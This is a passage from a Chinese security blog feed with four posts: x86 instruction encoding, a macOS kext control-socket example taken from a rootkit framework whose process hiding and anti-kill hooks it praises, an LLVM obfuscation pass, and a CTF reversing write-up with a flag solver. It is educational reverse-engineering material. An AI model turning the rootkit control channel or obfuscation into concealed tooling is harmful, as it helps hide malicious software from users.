[eax+ecx<em>2+0x0c] 在这条指令里eax是base寄存器，ecx是Index寄存器，2是scale，还有一个displacement ,这种内存寻址是base+index</em>scale+disp。这需要SIB字节来进行确定，那么ModRM必须要有一个手段来引出后续的SIB字节。在 [rax] ~ [rdi] 的范围里，Intel选择了原来应属于 [rsp] 的值用来引出SIB，一是因为 [rsp] 并不常用吧。二是因为 rsp 设计为 stack top指针，专用于stack top指针。<br>　　原来属于 [rsp] 的领域对应的，r/m是100，这个领域被 [SIB] 替代了，事实上在16位机器原本是没有SIB字节的，base+index*scale+disp这种寻址是后来才增加的。16位的ModRM上是没有SIB引导域。</p><p>(2)如果内存寻址中没有base和index，只有disp的话，如：mov ebx, [0x11223344]，这种直接寻址方式，在设计上ModRM还必须为提供这个模式。<br>　　Intel又作出修改，选择了原来属于 [rbp] 模式的领域提供给 [disp]，选择 [rbp] 让给 [disp]，是因为 rbp 原本意图就是设计为 stack基址指针。[rbp] 寻址一般都要加上一个偏移量，也就是基于stack frame指针的偏移量，即 [ebp + disp] 这种寻址模式在 mod = 01 或 mod = 10 中给出。</p></blockquote><h3 id="SIB"><a href="#SIB" class="headerlink" title="SIB"></a>SIB</h3><p>SIB意即：Scale – Index – Base，用来定义base+index*scale+disp这种寻址模式。同样按2-3-3比例组合。</p><table><thead><tr><th>7-6</th><th>5-4-3</th><th>2-1-0</th></tr></thead><tbody><tr><td>scale</td><td>index</td><td>base</td></tr></tbody></table><p>index 域指出index寄存器的ID值，范围从 000 ~ 111。base 域指出base寄存器的ID 值，从 000 ~ 111。Index与base经过 REX prefix可以扩展为0000 ~ 1111。</p><h3 id="Displacement-和-Immediate"><a href="#Displacement-和-Immediate" class="headerlink" title="Displacement 和 Immediate"></a>Displacement 和 Immediate</h3><p>某些指令会在最后要求有一个用于计算内存地址的值，或者一个立即数。很明显，不多说。</p><h3 id="综合起来，看下面的例子："><a href="#综合起来，看下面的例子：" class="headerlink" title="综合起来，看下面的例子："></a>综合起来，看下面的例子：</h3><ul><li><p><code>49 8b 7d 00</code></p><p>49=0100 1001对应REX prefix,默认64为size模式</p><p>8b= mov opcode</p><p>7d=01 111 101—&gt;ModR/M   mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。rdi ,r13</p><p>00=Displacement = 0</p><p>所以指令= mov rdi,QWORD PTR [r13+0]—&gt;mov rdi,[r13]</p><p>​</p></li></ul><h3 id="参考及索引"><a href="#参考及索引" class="headerlink" title="参考及索引"></a>参考及索引</h3><p><a href="http://ref.x86asm.net/coder32.html" target="_blank" rel="external">http://ref.x86asm.net/coder32.html </a>—-&gt; 查阅opcode</p><p><a href="http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png" target="_blank" rel="external">http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png</a> —&gt;quick look</p><p><a href="http://sparksandflames.com/files/x86InstructionChart.html" target="_blank" rel="external">Intel x86 Assembler Instruction Set Opcode Table</a></p><p><a href="http://www.mouseos.com/x64/index.html" target="_blank" rel="external">http://www.mouseos.com/x64/index.html</a></p><p><a href="https://bbs.pediy.com/thread-78121.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-78121.htm</a></p><p><a href="http://ytliu.info/blog/2016/12/10/x86zhi-ling-bian-ma-de-na-xie-shi-er/" target="_blank" rel="external">X86指令编码的那些事儿</a></p><p><a href="http://subler.github.io/note/compiler/x86_instruction_encode.html" target="_blank" rel="external">http://subler.github.io/note/compiler/x86_instruction_encode.html</a></p><p><a href="https://www.onlinedisassembler.com/odaweb/strcpy_x86" target="_blank" rel="external">onlineDisassembler</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;x86指令编码格式&quot;&gt;&lt;a href=&quot;#x86指令编码格式&quot; class=&quot;headerlink&quot; title=&quot;x86指令编码格式
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="x86" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/x86/"/>
    
  </entry>
  
  <entry>
    <title>一种用户层与kext内核扩展交互方式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/10/%E4%B8%80%E7%A7%8D%E7%94%A8%E6%88%B7%E5%B1%82%E4%B8%8Ekext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F/%E4%B8%80%E7%A7%8D%E7%94%A8%E6%88%B7%E5%B1%82%E4%B8%8Ekext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/10/一种用户层与kext内核扩展交互方式/一种用户层与kext内核扩展交互方式/</id>
    <published>2017-08-10T07:59:00.000Z</published>
    <updated>2017-08-10T10:34:57.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。<br>简单说下rootKit原理：<br>利用kext驻留在内核，完成实际的各种功能：<br><code>sys_ptrace</code>过滤 <code>PT_DENY_ATTACH</code>反调试<br>hook系统调用防止<code>sys_kil</code>（很强大有木有）<br>隐藏自身进程，文件监控，网络监控，提权等等<br>可谓是相当可怕。这些功能都可以通过一个用户进程来控制，所以这里必须有一种机制来提供kext与用户层的交互方式，这就是本文重点。</p></blockquote></blockquote><h3 id="0x01-一个例子进入kext开发"><a href="#0x01-一个例子进入kext开发" class="headerlink" title="0x01 一个例子进入kext开发"></a>0x01 一个例子进入kext开发</h3><p>在这之前，简单的用一个例子来学习下kext开发。下面关于xcode中的操作都很明显，故忽略。</p><p>打开xcode创建一个Generic Kernel Extension工程，完成之后会出现一个kext模板，如下</p><pre><code>#include &lt;mach/mach_types.h&gt;#include &lt;libkern/libkern.h&gt;kern_return_t TestExtension_stop(kmod_info_t *ki, void *d);kern_return_t TestExtension_start(kmod_info_t * ki, void *d){    printf(&quot;hello kext!\n&quot;);    return KERN_SUCCESS;}kern_return_t TestExtension_stop(kmod_info_t *ki, void *d){    printf(&quot;bye kext!\n&quot;);    return KERN_SUCCESS;}</code></pre><p>其中这两个函数分别在内核扩展加载和卸载时调用，比如上面我们只是打印一行hello kext，这句话就会在这个kext加载是打印出来（在系统日志中查看）你可能会有疑惑，系统如何知道是这两个函数的，这个是在工程中设置的，你可以改变成任何函数都是OK的。</p><p>简单编译一下，然后找到编译后的kext文件，输入命令改变权限</p><p><code>sudo chown -R root:wheel TestExtension.kext</code></p><p>再输入  </p><p><code>sudo kextload TestExtension.kext</code></p><p>加载内核扩展，如果一切没错的话，这时你在系统日志中就会出现hello kext这句话。同理你可以输入下面的命令</p><p><code>sudo kextunload TestExtension.kext</code></p><p>来卸载该内核扩展，你同样会看到bye kext这句话。</p><h3 id="0x02-用户层与内和扩展间的交互"><a href="#0x02-用户层与内和扩展间的交互" class="headerlink" title="0x02 用户层与内和扩展间的交互"></a>0x02 用户层与内和扩展间的交互</h3><p>下面要介绍的是一种类似于socket机制的交互机制，通常kext在加载的时候会建立一个socket服务器，然后用户层程序去打开这个socket（使用<code>PF_SYSTEM</code>协议）。接下来kext就会处理来至用户端的命令。下面同样通过一个例子来表明他们之间的交互，这里分为kext和客户端两部分。</p><h4 id="kext-示例代码"><a href="#kext-示例代码" class="headerlink" title="kext 示例代码"></a>kext 示例代码</h4><pre><code>#include &lt;sys/systm.h&gt;#include &lt;mach/mach_types.h&gt;#include &lt;mach/kern_return.h&gt; #include &lt;sys/kern_control.h&gt;//#include &lt;SOMEWHERE YOU CAN GET STRNCPY IN THE KERNEL FROM&gt;char name[] = &quot;com.example.mymodule&quot; ;//标识这个kextstruct kern_ctl_ref _ctlref ; kern_return_t start(kmod_info_t *info, void *data){    int err ;    struct kern_ctl_reg ctlreg ;    bzero(&amp;ctlreg, sizeof(ctlreg)) ;    //控制信息    ctlreg.ctl_id = 0 ; /* 请求分配一个动态id */    ctlreg.ctl_unit = 0 ;    strncpy(ctlreg.ctl_name, name, sizeof(ctlreg.ctl_name));    //回调函数    ctlreg.ctl_connect_func = connect ;    ctlreg.ctl_disconnect_func = disconnect ;    ctlreg.ctl_send_func = send ;    ctlreg.ctl_getopt_func = getopt ;    ctlreg.ctl_setopt_func = setopt ;    //注册内核控制    err = ctl_register(&amp;ctlreg, &amp;_ctlref) ;    if (err) return KERN_FAILURE ;    return KERN_SUCCESS ;}</code></pre><p>下面解释下其中的<code>kern_ctl_ref</code>数据结构</p><pre><code>struct kern_ctl_reg{    /* 控制信息 */    char        ctl_name[MAX_KCTL_NAME];    u_int32_t    ctl_id;    u_int32_t    ctl_unit;    /* 控制设置 */    u_int32_t    ctl_flags;    u_int32_t    ctl_sendsize;    u_int32_t    ctl_recvsize;    /* 回调函数 */    ctl_connect_func    ctl_connect;//建立连接时调用    ctl_disconnect_func    ctl_disconnect;//断开连接时调用    ctl_send_func    ctl_send;//处理从client到kernel的数据发送    ctl_setopt_func    ctl_setopt; //当client调用setsockopt时调用    ctl_getopt_func    ctl_getopt;//当client调用getsockopt时调用};</code></pre><h4 id="client-示例代码"><a href="#client-示例代码" class="headerlink" title="client 示例代码"></a>client 示例代码</h4><pre><code>#include &lt;socket.h&gt;#include &lt;string.h&gt;#include &lt;sys/kern_control.h&gt;#include &lt;sys/ioctl.h&gt;char name[] = &quot;com.example.mymodule&quot; ;//标识这个kextstatic int g_socket = -1;u_int32_t getctlidbybame(int sock, char *name) ;//建立连接int socket_ctl(char *name){    int g_sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL) ;    if (g_sock == 0) return 0 ;    u_int32_t id = getctlidbyname(g_sock, name) ;    sockaddr_ctl addr ;    addr.sc_len = sizeof(addr) ;    addr.sc_family = AF_SYSTEM ;    addr.sc_sysaddr = AF_SYS_CONTROL ;    addr.sc_id = id ;    addr.sc_unit = 0 ; /* allocate dynamically */    int err ;    err = connect(g_sock, (struct sockaddr*)&amp;addr, sizeof(addr)) ;    if (err) return 0 ;    return sock ;}u_int32_t getctlidbybame(int sock, char *name){    struct ctl_info info ;    memset(&amp;info, 0, sizeof(info)) ;    strncpy(info.ctl_name, name, strlen(name)) ;    int err = ioctl(sock, CTLIOCGINGO, &amp;info) ;    if (err) return 0 ; /* should do something stronger here! */    return info.ctl_id ;}int main(int argc, const char *argv[]){        socket_ctl(name);}//发送数据void execute_cmd(int cmd, char *args){    char data[32] = { 0 };    size_t data_len = 0;    int retv;    if(args != NULL) {        memcpy(data, args, strlen(args));    }    data_len = strlen(data) + 1;    retv = setsockopt(g_socket, SYSPROTO_CONTROL, cmd, (void *)data, (socklen_t)data_len);    if(retv != 0) {        printf(&quot;[ERROR] Kernel command execution failed:\n&quot;);        printf(&quot;\t%s (%d)\n&quot;, strerror(errno), errno);        return;    }}//接收数据void get_data(){    char *data = malloc(32);    socklen_t data_len = 32;    int retv = getsockopt(g_socket, SYSPROTO_CONTROL, 0, data, &amp;data_len);    if(retv != 0) {        printf(&quot;[ERROR] getsockopt()\n&quot;);        return;    }    size_t r = recv(g_socket, data, data_len, 0);    if(r == 0) {        printf(&quot;[ERROR] recv()\n&quot;);        return;    }}</code></pre><p>代码不是很复杂，先通过kext名去获取一个id建立一个socket，然后通过这个socket去发送和接受kext的数据。</p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>在这个rootKit框架中还有很多可以挖掘的东西，里面hook系统调用来达到反kill等功能很是实用，以及一些内核操作手段都值得学习和借鉴，待续…</p><h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><ul><li><a href="http://www.tanhao.me/pieces/1515.html/" target="_blank" rel="external">http://www.tanhao.me/pieces/1515.html/</a></li><li><a href="https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html" target="_blank" rel="external">https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html</a></li><li><a href="https://github.com/enzolovesbacon/inficere">https://github.com/enzolovesbacon/inficere</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。&lt;br&gt;简单说下rootKit原理：&lt;br&gt;利用kext驻留在内核，完成实际的各种功能：&lt;br&gt;&lt;code&gt;sys
      
    
    </summary>
    
      <category term="kext/iokit" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/kext-iokit/"/>
    
    
      <category term="kext" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"/>
    
  </entry>
  
  <entry>
    <title>初-LLVM的代码混淆</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/06/25/%E5%88%9D-LLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E5%88%9D-LLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/06/25/初-LLVM的代码混淆/初-LLVM的代码混淆/</id>
    <published>2017-06-25T07:09:13.000Z</published>
    <updated>2019-02-21T09:55:50.563Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-目录"><a href="#0x00-目录" class="headerlink" title="0x00 目录"></a>0x00 目录</h2><blockquote><blockquote><p>断断续续的学习了一段时间的LLVM，记录下学习进度，随着后面的学习待更新</p></blockquote></blockquote><ul><li>LLVM简介</li><li>一个基于LLVM简单的代码混淆例子</li><li>参考链接</li></ul><h2 id="0x01-LLVM简介"><a href="#0x01-LLVM简介" class="headerlink" title="0x01 LLVM简介"></a>0x01 LLVM简介</h2><p>LLVM(low level virtual machine)是一个先进的编译器框架，它提供了一种代码编写良好的中间表示(IR)，可以作为多种语言的后端，还可以提供与变成语言无关的优化和针对多种cpu的代码生成功能。<br>LLVM的主要架构如下：</p><ul><li>前端：前端用来获取源代码然后将它转变为某种中间表示，我们可以选择不同的编译器来作为LLVM的前端，如gcc，clang。</li><li>Pass：Pass是LLVM优化工作的一个节点，一个节点做些事，一起加起来就构成了LLVM完整的优化和转化。</li><li>后端：后端用来生成实际的机器码，一般情况下不会关注这一部分。</li></ul><h3 id="LLVM框架："><a href="#LLVM框架：" class="headerlink" title="LLVM框架："></a>LLVM框架：</h3><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-0.png?raw=true" alt="0-0"><br>这里与传统的编译器不同，LLVM采用了一种统一的中间表示：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-1.png?raw=true" alt="0-1"></p><h3 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a>安装与使用</h3><p>首先下载LLVM  </p><pre><code>$ cd where-you-want-llvm-to-live$ svn co http://llvm.org/svn/llvm-project/llvm/trunk llvm</code></pre><p>我们选择clang作为LLVM前端，然后下载clang  </p><pre><code>$ cd where-you-want-llvm-to-live$ cd llvm/tools$ svn co http://llvm.org/svn/llvm-project/cfe/trunk clang</code></pre><p>下载编译运行库</p><pre><code>$ cd where-you-want-llvm-to-live$ cd llvm/projects$ svn co http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt</code></pre><p>最后编译LLVM源码</p><pre><code>$ mkdir build$ cd build$ cmake -DCMAKE_BUILD_TYPE:String=Release ../llvm/$ make</code></pre><p>编译时间可能有点长，编译完成之后进行安装</p><pre><code>$sudo make install</code></pre><p>接下来就是LLVM的使用，先创建一个hello.c源文件</p><pre><code>#include &lt;stdio.h&gt;int main(){    printf(&quot;hello LLVM\n&quot;);    return 0;}</code></pre><h2 id="0x02-一个基于LLVM简单的代码混淆例子"><a href="#0x02-一个基于LLVM简单的代码混淆例子" class="headerlink" title="0x02 一个基于LLVM简单的代码混淆例子"></a>0x02 一个基于LLVM简单的代码混淆例子</h2><p>Pass是LLVM中一个很重要的部分，每个Pass都是做优化或者转换的工作，LLVM的优化和转换工作就是由很多个Pass一起完成的。我们通过继承指定的类以及实现相关的虚函数来实现具体的Pass，具体的类型主要有以下几种：  </p><ul><li>ImmutablePass</li><li>MoudlePass</li><li>CallGraphSCCPass</li><li>FuncationPass</li><li>LoopPass</li><li>RegionPass</li><li>BasicBlockPass</li><li>MachineFunctionPass</li></ul><p>下面这个例子来介绍一下pass的编写并达到简单的混淆。从这里下载这个模板<a href="https://github.com/NULL-ME/NULL-ME.github.io/tree/master/articlePic/LLVM/skeleton">llvm-pass-skeleton</a></p><p>下面是完整代码：</p><pre><code>#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;#include &quot;llvm/IR/Intrinsics.h&quot;#include &quot;llvm/IR/Instructions.h&quot;using namespace llvm;namespace {  struct SkeletonPass : public FunctionPass {    static char ID;    SkeletonPass() : FunctionPass(ID) {}    // virtual bool runOnFunction(Function &amp;F) {    //   errs() &lt;&lt; &quot;I saw a function called &quot; &lt;&lt; F.getName() &lt;&lt; &quot;!\n&quot;;    //   return false;    // }    bool runOnFunction(Function &amp;F) override {            Function *tmp = &amp;F;            // 遍历函数中的所有基本块            for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) {                // 遍历基本块中的每条指令                for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) {                    // 是否是add指令                    if (inst-&gt;isBinaryOp()) {                        if (inst-&gt;getOpcode() == Instruction::Add) {                            ob_add(cast&lt;BinaryOperator&gt;(inst));                        }                    }                }            }            return false;        }        // a+b === a-(-b)        bool ob_add(BinaryOperator *bo) {            BinaryOperator *op = NULL;            if (bo-&gt;getOpcode() == Instruction::Add) {                // 生成 (－b)                op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo);                // 生成 a-(-b)                op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, &quot;&quot;, bo);                op-&gt;setHasNoSignedWrap(bo-&gt;hasNoSignedWrap());                op-&gt;setHasNoUnsignedWrap(bo-&gt;hasNoUnsignedWrap());            }            // 替换所有出现该指令的地方            bo-&gt;replaceAllUsesWith(op);        }  };}char SkeletonPass::ID = 0;// Automatically enable the pass.// http://adriansampson.net/blog/clangpass.htmlstatic void registerSkeletonPass(const PassManagerBuilder &amp;,                         legacy::PassManagerBase &amp;PM) {  PM.add(new SkeletonPass());}static RegisterStandardPasses  RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible,                 registerSkeletonPass);</code></pre><p>通过继承<code>FunctionPass</code>重写虚函数<code>runOnFunction</code>来到达我们代码混淆的目的，再看关键的混淆部分，如下面注释那样，找到函数中的add指令，并将其改为sub指令。如<code>a+b</code>经过混淆为<code>a-(-b)</code></p><pre><code>bool runOnFunction(Function &amp;F) override {            Function *tmp = &amp;F;            // 遍历函数中的所有基本块            for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) {                // 遍历基本块中的每条指令                for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) {                    // 是否是add指令                    if (inst-&gt;isBinaryOp()) {                        if (inst-&gt;getOpcode() == Instruction::Add) {                            ob_add(cast&lt;BinaryOperator&gt;(inst));                        }                    }                }            }            return false;        }</code></pre><p>代码很简单，这里就不多说。我们使用</p><pre><code>$clang -Xclang -load -Xclang build/skeleton/libSkeletonPass.* something.c</code></pre><p>来运行这个pass编译成目标可执行文件<br>现在我们创建一个addTest.c文件来测试是否代码混淆</p><pre><code>#include &lt;stdio.h&gt;int func(int a,int b){    return a + b;}int main(){    int c;    c = func(6,9);    printf(&quot;%d\n&quot;,c);    return c;}</code></pre><p>先按照一般的编译源代码，查看关键汇编代码：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-2.png?raw=true" alt="0-2"><br>然后运行我们的pass进行编译<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-3.png?raw=true" alt="0-3"><br>很明显，汇编代码发生了改变，当然这里仅仅是一个简单的混淆，感兴趣的可以研究下<a href="https://github.com/obfuscator-llvm">obfuscator-llvm</a>这个项目。</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="http://www.tuicool.com/articles/2meqIjq" target="_blank" rel="external">深入剖析 iOS 编译 Clang / LLVM</a><br><a href="http://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/" target="_blank" rel="external">http://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-目录&quot;&gt;&lt;a href=&quot;#0x00-目录&quot; class=&quot;headerlink&quot; title=&quot;0x00 目录&quot;&gt;&lt;/a&gt;0x00 目录&lt;/h2&gt;&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;断断续续的学习了一段时间的LLVM，记录下学习进
      
    
    </summary>
    
      <category term="LLVM" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/LLVM/"/>
    
    
      <category term="LLVM" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLVM/"/>
    
      <category term="obfuscation" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/obfuscation/"/>
    
  </entry>
  
  <entry>
    <title>pwnhub-CTF re150</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/</id>
    <published>2017-05-28T01:16:13.000Z</published>
    <updated>2019-02-21T10:03:11.419Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p>第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度的，这里记录下其中的一道逆向题。题目在<a href="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/re150?raw=true">这里</a></p><h2 id="0x01-简单分析"><a href="#0x01-简单分析" class="headerlink" title="0x01 简单分析"></a>0x01 简单分析</h2><p>拿到题目后试着在虚拟机里运行了一下，看下有什么提示<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-0.png?raw=true" alt="0-0"></p><p>然后转去hopper搜下相关字符串，并没有发现<code>error</code>相关字符串，syclover也没有相关<code>printf</code>等函数输出，看来只能上gdb调试看看。</p><p>发现程序里面有多处花指令以及隐藏了程序入口。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-1.png?raw=true" alt="0-0"></p><p>由上图可以发现syclover直接由<code>int 0x80</code>系统调用中断输出到屏幕，下面是一个循环解密，后面可知解密的正是程序的入口。</p><p>由<code>__libc_start_main</code>函数可得第一个参数即为<code>main</code>函数地址<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-2.png?raw=true" alt="0-0"><br>这里作为对比，可以看下hopper中对<code>0x8048320</code>main函数的解析<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-3.png?raw=true" alt="0-0"><br>完全不知道是什么有木有？所以拿到题如果放到IDA之类的反汇编工具根本看不出什么线索</p><p>接下来所做的事就是获取输入的字符串然后进行加密，然后与程序里的字符串加密比较，具体看后面的代码。</p><h2 id="0x02-修复程序"><a href="#0x02-修复程序" class="headerlink" title="0x02 修复程序"></a>0x02 修复程序</h2><p>根据上面的分析，我们将程序进行修复</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;assert.h&gt;#include &lt;elf.h&gt;#define ENTRY 0x08048320#define FILE_OFF 0x320#define COUNT 0x432int main(int argc,char *argv[]){    Elf32_Ehdr ehdr;    unsigned char buf[COUNT] = {0};    assert(argc == 2);    int fd = open(argv[1],O_RDWR);//打开文件    assert(fd&gt;0);    assert(lseek(fd,0,SEEK_SET)!=-1);// 读取elf头    assert(read(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr));     ehdr.e_entry = ENTRY;//修改入口地址      assert(lseek(fd,0,SEEK_SET)!=-1);//回写elf头    assert(write(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr));      //解密    assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//读取被加密的代码    assert(read(fd,buf,COUNT) == COUNT);    int i = 0;    while(i&lt;COUNT){        buf[i] = (buf[i]^66)&lt;&lt;5 | (buf[i]^66)&gt;&gt;3;         i++;         }    assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//写入正确代码    assert(write(fd,buf,COUNT) == COUNT);</code></pre><h2 id="0x03-分析算法计算flag"><a href="#0x03-分析算法计算flag" class="headerlink" title="0x03 分析算法计算flag"></a>0x03 分析算法计算flag</h2><pre><code>#!/usr/bin/python# -*- coding: UTF-8 -*-from __future__ import print_function  import sysdef getflag():    print(&quot;[i]start to encrypt key&quot;)    key = [0x73,0x8d,0xf2,0x4c,0xc7,0xd4,0x7b,0xf7,0x18,0x32,0x71,0x0d,0xcf,0xdc,0x67,0x4f,0x7f,0x0b,0x6d]    encryptKey = []    print(&quot;encryptKey=[&quot;, end=&quot;&quot;)    for idx in range(len(key)):        encryptKey.append(key[idx] ^ 0x20)        print(&quot;%x &quot; % encryptKey[idx], end=&quot;&quot;)    print(&quot;]&quot;)      flag = []    print(&quot;[i]find the flag&quot;)    for i in range(len(encryptKey)):        count = 0x00        while(count &lt;= 0x7f):            one = count &gt;&gt; (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d))            two = count &lt;&lt; (0x8 - (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d)))            if((((one | two) ^ i) &amp; 0xff) == encryptKey[i]):                flag.append(count)                break            count = count + 1    print(&quot;flag = &quot;,end=&quot;&quot;)    for i in range(len(flag)):        print(&quot;%c&quot; % flag[i], end=&quot;&quot;)   if __name__ == &#39;__main__&#39;:    key = getflag()</code></pre><p>最后运行程序得到flag</p><pre><code>[i]start to encrypt keyencryptKey=[53 ad d2 6c e7 f4 5b d7 38 12 51 2d ef fc 47 6f 5f 2b 4d ][i]find the flagflag = SYC{&gt;&gt;Wh06m1&gt;&gt;R0Ot}</code></pre><p>测试：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-4.png?raw=true" alt="0-0"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;p&gt;第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度
      
    
    </summary>
    
      <category term="CTF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CTF/"/>
    
      <category term="writeup" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/writeup/"/>
    
  </entry>
  
</feed>
